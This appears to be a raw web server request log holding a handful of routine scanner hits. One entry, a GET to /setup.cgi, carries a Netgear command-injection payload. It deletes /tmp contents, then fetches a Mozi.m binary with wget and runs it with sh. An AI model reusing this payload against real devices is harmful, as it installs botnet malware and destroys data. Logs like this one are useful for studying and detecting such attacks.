#**# 2021-03-02 02:11:40.626 [2dcf75b581024598bdfe5320b4af90fb]
[F] - 2021-03-02 02:11:40.624
	id: null
	info: GET / 74.120.14.55 
	controller:  > 
	query: {null}
	body: 
	returnCode: -1(-1)
	elapsed-time: 2ms
#**#
#**# 2021-03-02 02:42:15.911 [ff2a07ca1dff414fb14d8ca8680500f7]
[F] - 2021-03-02 02:42:15.911
	id: null
	info: GET / 2.57.122.25 
	controller:  > 
	query: {null}
	body: 
	returnCode: -1(-1)
	elapsed-time: 0ms
#**#
#**# 2021-03-02 02:42:16.210 [8169eb2ee904443aa2b914b52b1fec88]
[F] - 2021-03-02 02:42:16.209
	id: null
	info: GET /favicon.ico 2.57.122.25 
	controller:  > 
	query: {null}
	body: 
	returnCode: -1(-1)
	elapsed-time: 1ms
#**#
#**# 2021-03-02 02:44:07.308 [069cb2e726384488b794bd2d693a29d7]
[F] - 2021-03-02 02:44:07.308
	id: null
	info: GET /setup.cgi 45.222.11.194 
	controller:  > 
	query: {next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1}
	body: 
	returnCode: -1(-1)
	elapsed-time: 0ms
#**#
#**# 2021-03-02 02:50:40.662 [3a9dab21cd224c058e3dbe9ba29369e9]
[F] - 2021-03-02 02:50:40.661
	id: null
	info: GET / 2.57.122.25 
	controller:  > 
	query: {null}
	body: 
	returnCode: -1(-1)
	elapsed-time: 1ms
#**#
#**# 2021-03-02 02:50:40.996 [fbda31b87d88431facbc20c09793474f]
[F] - 2021-03-02 02:50:40.996
	id: null
	info: GET /favicon.ico 2.57.122.25 
	controller:  > 
	query: {null}
	body: 
	returnCode: -1(-1)
	elapsed-time: 0ms
#**#
